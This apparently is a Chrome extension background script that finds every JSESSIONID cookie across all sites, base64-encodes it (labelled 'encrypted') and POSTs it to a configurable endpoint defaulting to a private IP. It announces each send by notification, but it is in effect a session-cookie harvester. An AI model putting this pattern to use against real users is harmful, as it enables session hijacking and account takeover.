name='JSESSIONID';

var endpoint="https://192.168.99.100/token";
var notifications=true;

getData()

chrome.storage.onChanged.addListener(function(changes, namespace) {
        console.info('Detected an storage change. Reloading data');
        getData();
      });

function getData() {
    chrome.storage.sync.get( function ( data ) {
        endpoint = data.url;
        notifications = data.notifications;
        // console.log(endpoint);
        // console.log(notifications);
    } )
}

function search_cookie()
{
    console.log('Searching for token');
    chrome.cookies.getAll({}, function (cookies) {
        console.log(cookies);
        cookies.forEach(function(cookie) {
            if(cookie.name == name)
            {
                // console.log(JSON.stringify(cookie.value));
                notification('RCV','Token detected. Sending signal');
                sendTokenToService(cookie)
            };
    });
    }
    );
 }


function sendTokenToService(cookie){
    var data = cookie.name+'='+cookie.value;
    console.log("Cookie name: "+cookie.name);
    console.log("Cookie value: "+cookie.value);
    encrypted_data = btoa(data);
    var json = {"token":encrypted_data};
    $.ajax({
        type: "POST",
        url: endpoint,
        data: JSON.stringify(json),
        contentType:"application/json; charset=utf-8",
        success: function (){
            notification('ACK','Signal sent successfully');
        }
    });
}

function notification(title,message)
{
    if(notifications)
    {
        chrome.notifications.create(title, {
            type: 'basic',
            iconUrl: 'icon.png',
            title: title,
            message: message
         });
    }
}

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    console.info('Detected a message from content script');
    console.log(sender.tab ?
                "from a content script:" + sender.tab.url :
                "from the extension");
    search_cookie();
    if (request.greeting == "token")
      sendResponse({farewell: "received"});
  });

chrome.browserAction.onClicked.addListener(function(tab) {
    console.info('Detected a button click. Sending mock data');
    var cookie = {'name':'testing','value':'program'}
    sendTokenToService(cookie);
});